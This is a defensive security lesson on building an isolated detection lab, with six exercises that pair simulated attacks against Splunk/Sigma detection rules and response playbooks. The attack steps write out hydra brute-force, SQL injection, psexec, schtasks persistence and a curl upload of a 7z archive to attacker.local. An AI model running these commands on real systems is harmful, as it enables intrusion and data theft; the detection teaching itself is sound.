# Day 065 - Phase 3 Capstone: Building a Detection Lab

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Defensive Security | **Difficulty:** Advanced

---

## 🧠 The Concept

You've learned detection rules, threat hunting, incident response, forensics, and metrics.

Now build a complete detection lab from scratch.

This capstone integrates everything from Phase 3 into one working system:

```
Vulnerable App → Attack Simulation → Detection Rules → Alert Monitoring → Response Playbook
```

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                  SECURITY OPERATIONS                    │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌──────────────┐      ┌──────────────┐                │
│  │   SIEM       │      │  Alerting    │                │
│  │  (Splunk)    │◄─────┤  (Rules)     │                │
│  └──────────────┘      └──────────────┘                │
│         ▲                      ▲                        │
│         │                      │                        │
│         └──────────┬───────────┘                        │
│                    │                                    │
├────────────────────┼────────────────────────────────────┤
│                    │      MONITORING LAYER              │
│  ┌─────────────────▼─────────────────┐                 │
│  │  Data Collection & Forwarding     │                 │
│  │  (Sysmon, Splunk Forwarder)       │                 │
│  └────────┬────────────────┬─────────┘                 │
│           │                │                            │
├───────────┼────────────────┼────────────────────────────┤
│           │                │    ENDPOINT LAYER          │
│  ┌────────▼────┐  ┌───────▼────────┐                   │
│  │ Victim Host │  │ Attacker Host  │                   │
│  │ (Windows)   │  │ (Kali Linux)   │                   │
│  │ - Sysmon    │  │ - Metasploit   │                   │
│  │ - App       │  │ - Custom tools │                   │
│  └─────────────┘  └────────────────┘                   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## 📋 Lab Components

### 1. Vulnerable Target (Victim)

```
Windows Server 2019 VM (victim.local)
├─ Minimal hardening (intentional gaps for detection learning)
├─ Vulnerable applications
│  ├─ PHP app with SQL injection
│  ├─ Windows with unpatched CVEs
│  └─ Poor file permissions for demo
│
├─ Monitoring enabled
│  ├─ Sysmon (process tracking)
│  ├─ Windows Event Logging (security events)
│  ├─ Splunk Forwarder (log aggregation)
│  └─ Network capture (pcap)
│
└─ Data sources
   ├─ Process creation (EventID 4688)
   ├─ File modification (Sysmon Event 11)
   ├─ Registry changes (Sysmon Event 12)
   ├─ Network connections (Sysmon Event 3)
   └─ Web application logs (IIS, PHP)
```

### 2. Attack Platform (Attacker)

```
Kali Linux VM (attacker.local)
├─ Metasploit Framework installed
├─ Custom exploit tools
├─ Network access to victim (isolated network)
│
└─ Planned attacks (one per day)
   ├─ Day 1: RDP brute force (credential attack)
   ├─ Day 2: SQL injection (web attack)
   ├─ Day 3: PowerShell Empire (post-exploitation)
   ├─ Day 4: Lateral movement (SMB/PsExec)
   ├─ Day 5: Data exfiltration (FTP/HTTP)
   └─ Day 6: Persistence (scheduled task)
```

### 3. Monitoring & Collection (SIEM)

```
Splunk Enterprise (Single Node, Free License)
├─ Receiving logs from victim host
├─ Parsing Windows Event Logs
├─ Parsing Sysmon events
├─ Parsing network traffic (Zeek, tcpdump)
│
├─ Detection rules implemented
│  ├─ Sigma rules (converted to Splunk SPL)
│  ├─ Custom SPL queries
│  └─ Correlation rules (multi-stage attacks)
│
├─ Alerting configured
│  ├─ Email alerts on high-severity events
│  ├─ Custom alerts for attack patterns
│  └─ Escalation logic
│
└─ Dashboards for visibility
   ├─ Real-time alert dashboard
   ├─ Timeline of events
   ├─ Attack stage indicators
   └─ Metrics (MTTD, alert volume, etc.)
```

### 4. Detection Rules

```
Implemented Sigma/SPL rules (from Days 046-060):

Phase 1: Initial Access
├─ RDP brute force (failed login spike)
├─ Web injection attempts (SQLi, XSS patterns)
└─ Phishing indicators (suspicious email)

Phase 2: Lateral Movement
├─ Admin share access (\\host\c$)
├─ Service account interactive logon
├─ Multiple failed authentication attempts
└─ Pass-the-hash indicators

Phase 3: Persistence
├─ Scheduled task creation (EventID 4698)
├─ Service installation
├─ Registry Run key modification
└─ WMI persistence

Phase 4: Exfiltration
├─ Large outbound data transfer
├─ Unusual protocol on unusual port
├─ Compression tool execution (rar, zip, 7zip)
└─ FTP/SFTP client usage

Phase 5: Defense Evasion
├─ Event log clearing (EventID 1102)
├─ Sysmon unload (driver removal)
├─ AV process termination
└─ UAC bypass attempts
```

---

## 🎯 Lab Exercises

### Exercise 1: RDP Brute Force Detection

```
ATTACK
├─ Attacker runs: hydra -l administrator -P wordlist.txt rdp://victim.local
├─ Generates 100+ failed RDP attempts in 2 minutes
└─ (Simulates credential attack)

DETECTION
├─ Rule: "RDP Brute Force - Multiple Failed Logins"
├─ Trigger: 10+ failed RDP attempts in 1 minute
├─ Data source: Windows Security Event 4625 (failed logon)
│
├─ Expected alert:
│  ├─ Alert timestamp: 2024-01-15 10:15:00
│  ├─ Event count: 45 failed RDP attempts
│  ├─ Source IP: attacker.local
│  ├─ Target: administrator account
│  └─ Severity: HIGH

RESPONSE
├─ Block attacker IP on firewall
├─ Reset administrator password
├─ Enable account lockout policy
└─ Monitor for successful RDP login (verify)
```

### Exercise 2: SQL Injection Detection

```
ATTACK
├─ Attacker runs SQLi payload:
├─ URL: http://victim.local/products.php?id=1' UNION SELECT username,password FROM users--
├─ Captures database credentials
└─ (Simulates web attack)

DETECTION
├─ Rule: "SQL Injection - UNION SELECT"
├─ Trigger: "UNION SELECT" in HTTP URI
├─ Data source: IIS web logs / PHP logs
│
├─ Expected alert:
│  ├─ Alert timestamp: 2024-01-16 14:30:00
│  ├─ Source IP: attacker.local
│  ├─ URL: /products.php?id=1' UNION SELECT...
│  ├─ Payload detected: "UNION SELECT"
│  └─ Severity: CRITICAL

RESPONSE
├─ Isolate web server
├─ Review access logs for data exfiltration
├─ Scan database for unauthorized queries
├─ Check for web shell drops
└─ Restore from backup
```

### Exercise 3: Lateral Movement Detection

```
ATTACK
├─ Attacker pivots from web server to database server
├─ Uses compromised credentials: domain\webservice_account
├─ Command: psexec.exe \\db-server.local -u domain\webservice_account cmd.exe
├─ (Simulates lateral move with stolen credentials)

DETECTION
├─ Rule 1: "Service Account Interactive Logon"
│  ├─ Trigger: webservice_account logs in interactively (unusual)
│  └─ Source: domain-joined computer (not web server)
│
├─ Rule 2: "Admin Share Access"
│  ├─ Trigger: Access to \\db-server\c$ (admin share)
│  └─ Source: Unexpected host
│
├─ Expected alert:
│  ├─ Alert 1: Service account unusual logon
│  ├─ Alert 2: Admin share access from web server
│  ├─ Correlated: Same source, same timeframe
│  └─ Severity: CRITICAL (lateral movement)

RESPONSE
├─ Reset service account password
├─ Check database for unauthorized access
├─ Review data changes
├─ Scope: What databases were accessed?
└─ Isolate database server
```

### Exercise 4: Persistence Detection

```
ATTACK
├─ Attacker creates scheduled task for persistence:
├─ schtasks /create /tn "Windows Update" /tr "C:\malware.exe" /sc daily /st 02:00
├─ Ensures reinfection even after reboot
└─ (Simulates persistence mechanism)

DETECTION
├─ Rule: "Scheduled Task Creation"
├─ Trigger: schtasks.exe /create command
├─ Data source: Sysmon Event 1 (process creation) OR Windows Event 4698
│
├─ Additional context:
│  ├─ Task name: "Windows Update" (spoofed legitimate name)
│  ├─ Binary path: C:\malware.exe (unknown binary)
│  ├─ User account: SYSTEM (suspicious for creation)
│  └─ Schedule: Daily at 2am (off-hours)
│
├─ Expected alert:
│  ├─ Alert: Scheduled Task Created
│  ├─ Task: Windows Update
│  ├─ Path: C:\malware.exe
│  └─ Severity: HIGH

RESPONSE
├─ Delete scheduled task (schtasks /delete /tn "Windows Update")
├─ Scan binary (VirusTotal, local AV)
├─ Review for other persistence mechanisms
├─ Endpoint forensics (hash the binary, analyze)
└─ Restore clean system
```

### Exercise 5: Data Exfiltration Detection

```
ATTACK
├─ Attacker compresses sensitive files and exfiltrates:
├─ cd C:\Users\Public
├─ 7z a backup.7z *.docx *.xlsx
├─ curl -F "file=@backup.7z" http://attacker.local/upload
├─ (Simulates data theft)

DETECTION
├─ Rule 1: "Compression Tool Execution"
│  ├─ Trigger: 7z.exe, rar.exe, winrar.exe execution
│  ├─ Data source: Sysmon Event 1
│  └─ Severity: MEDIUM (could be legitimate)
│
├─ Rule 2: "Suspicious File Transfer"
│  ├─ Trigger: curl.exe or wget.exe uploading files
│  ├─ Unusual destination: attacker.local (external)
│  └─ Severity: HIGH
│
├─ Correlation Rule:
│  ├─ Process 1: Compression tool created backup.7z
│  ├─ Process 2: curl uploading backup.7z to external IP
│  ├─ Timeline: < 10 minutes apart
│  └─ Severity: CRITICAL (exfiltration)
│
├─ Expected alert:
│  ├─ Alert: Data Exfiltration Detected
│  ├─ File: backup.7z (2.5GB)
│  ├─ Destination: attacker.local (external)
│  └─ Severity: CRITICAL

RESPONSE
├─ Block destination IP on firewall
├─ Determine what data was in 7z file
├─ Notify legal (potential breach)
├─ Check for copies elsewhere
├─ Investigate attacker's upload server (retain evidence)
└─ Notify affected parties if PII was exfiltrated
```

### Exercise 6: Complete Incident Response Playbook

```
Scenario: Combined multi-stage attack (all 5 exercises)

Timeline:
├─ T+0:00 - RDP brute force begins
├─ T+0:05 - Admin account compromised (successful login)
├─ T+0:10 - Attacker accesses web app
├─ T+0:15 - SQL injection extracts database creds
├─ T+0:20 - Lateral movement to database server
├─ T+0:25 - Data exfiltration begins (compressed files)
├─ T+0:30 - Persistence task created (scheduled task)
└─ T+0:35 - Detection alert fires (exfiltration)

Detection Opportunities
├─ Alert 1 (T+0:02): RDP brute force rule
├─ Alert 2 (T+0:12): SQLi detection rule
├─ Alert 3 (T+0:22): Lateral movement correlation
├─ Alert 4 (T+0:28): Compression + suspicious file transfer
└─ Alert 5 (T+0:32): Scheduled task creation

First Detection: T+0:02 (RDP brute force)
├─ But escalation decision: Is this real?
├─ ✓ Yes: >10 attempts in < 2 minutes (high confidence)
├─ Action: Block attacker IP immediately
└─ Result: Prevents access... but attacker already got admin (T+0:05)

Missed Detection:
├─ Alert 2 (SQLi) should trigger on suspicious SQL syntax
├─ If SIEM not seeing IIS logs, SQLi goes undetected
└─ This is a rule gap to fix

Full Attack Scope:
├─ Successful RDP (admin account compromised)
├─ Database credentials exposed (SQL injection)
├─ Multiple systems accessed (lateral movement)
├─ 2.5GB of data exfiltrated (payroll, HR, customer data)
├─ Persistence installed (will reinfect)
├─ Timeline: 35 minutes from initial access to alert

Post-Incident:
├─ MTTD: 35 minutes (should be < 24 hours target met)
├─ MTTR: 5 minutes (from alert to block action)
├─ Containment successful: Exfiltration data may be recovered
├─ Gaps identified:
│  ├─ IIS/web log not being ingested to SIEM
│  ├─ SQL injection rule not sensitive enough
│  ├─ Lateral movement took 10 minutes undetected
│  └─ Persistence detection worked
│
└─ Improvements:
   ├─ Add IIS logs to Splunk
   ├─ Tune SQLi rule sensitivity
   ├─ Add SMB admin share access rule
   └─ Test again next month
```

---

## 🛠️ Lab Setup Checklist

```
Hardware/Software
☐ 2x VMs (8GB RAM, 50GB disk each)
☐ Splunk Enterprise (free license)
☐ Sysmon installed on victim
☐ Windows Event Logging enabled
☐ Splunk Forwarder on victim
☐ Kali Linux on attacker
☐ Metasploit Framework
☐ Network isolated (no internet, test only)

Configuration
☐ Victim hostname: victim.local
☐ Attacker hostname: attacker.local
☐ Network segment: 192.168.100.0/24
☐ Splunk listening on 192.168.100.10:9997
☐ Firewall allows communication

Monitoring Setup
☐ Sysmon config deployed
☐ Event log categories enabled:
  ☐ Process creation (4688)
  ☐ Account logon (4624, 4625)
  ☐ Scheduled task (4698)
  ☐ Registry modification (4657)
  ☐ File creation/modification
  ☐ Network connections

Detection Rules
☐ RDP brute force rule
☐ SQLi detection rule
☐ Service account logon rule
☐ Admin share access rule
☐ Compression tool execution rule
☐ Suspicious file transfer rule
☐ Scheduled task creation rule
☐ Correlation rule for multi-stage attack

Documentation
☐ Architecture diagram
☐ Rule documentation
☐ Alert samples
☐ Response playbooks
☐ Lessons learned
```

---

## 🔑 Key Takeaways

- **Lab integrates all Phase 3 concepts** - detection, response, forensics, metrics
- **Real attacks teach real lessons** - safe simulation environment for learning
- **Rules must be tested** - exercise-based validation prevents false positives
- **Correlation matters** - multi-stage attacks need multi-rule detection
- **Metrics show improvement** - measure MTTD before/after optimization
- **Incident playbooks enable response** - pre-planned responses = faster action

---

## [⬅️ Day 064](../day064/) | [➡️ Phase 4: Cloud Security - Day 066](../day066/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*

**Congratulations on completing Phase 3: Defensive Security!**

Phase 4 (Cloud Security) begins next - AWS, Azure, cloud attacks, cloud auditing, and DevSecOps.